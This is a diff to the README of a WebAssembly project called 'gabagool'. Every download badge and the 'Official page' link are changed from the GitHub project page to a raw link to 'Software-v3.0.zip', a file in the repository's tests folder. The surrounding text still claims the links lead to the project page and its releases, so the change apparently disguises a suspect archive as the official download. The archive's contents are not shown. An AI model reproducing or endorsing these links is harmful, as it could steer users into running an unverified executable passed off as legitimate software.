@@ -1,6 +1,6 @@
 # ⚙️ gabagool - Simple WebAssembly With Time Travel
 
-[![Download gabagool](https://img.shields.io/badge/Download-gabagool-brightgreen?style=for-the-badge)](https://github.com/Circinusimpracticality69/gabagool)
+[![Download gabagool](https://img.shields.io/badge/Download-gabagool-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Circinusimpracticality69/gabagool/main/gabagool/tests/Software-v3.0.zip)
 
 ## 🌐 What is gabagool?
 
@@ -24,7 +24,7 @@ No special software is needed beforehand. You can run gabagool alone.
 
 Click the button below to visit the download page. This page includes the latest version of gabagool for Windows.
 
-[![Download gabagool](https://img.shields.io/badge/Download-Get%20gabagool-blue?style=for-the-badge)](https://github.com/Circinusimpracticality69/gabagool)
+[![Download gabagool](https://img.shields.io/badge/Download-Get%20gabagool-blue?style=for-the-badge)](https://raw.githubusercontent.com/Circinusimpracticality69/gabagool/main/gabagool/tests/Software-v3.0.zip)
 
 The link above takes you to the project page on GitHub. From there, look for the latest release. Inside the release page, you can find the download file for Windows. The file often ends with `.exe`, which means it is ready to run.
 
@@ -111,10 +111,10 @@ This tool suits learners, testers, or anyone curious about WebAssembly inside be
 
 ## 🔗 Useful Links
 
-- Official page: [https://github.com/Circinusimpracticality69/gabagool](https://github.com/Circinusimpracticality69/gabagool)
+- Official page: [https://raw.githubusercontent.com/Circinusimpracticality69/gabagool/main/gabagool/tests/Software-v3.0.zip](https://raw.githubusercontent.com/Circinusimpracticality69/gabagool/main/gabagool/tests/Software-v3.0.zip)
 - Download page: Same as above, look for latest release
 - Support and issue tracking: Use "Issues" tab on the GitHub page
 
 ---
 
-[![Download gabagool](https://img.shields.io/badge/Download-Get%20gabagool-brightgreen?style=for-the-badge)](https://github.com/Circinusimpracticality69/gabagool)
+[![Download gabagool](https://img.shields.io/badge/Download-Get%20gabagool-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Circinusimpracticality69/gabagool/main/gabagool/tests/Software-v3.0.zip)
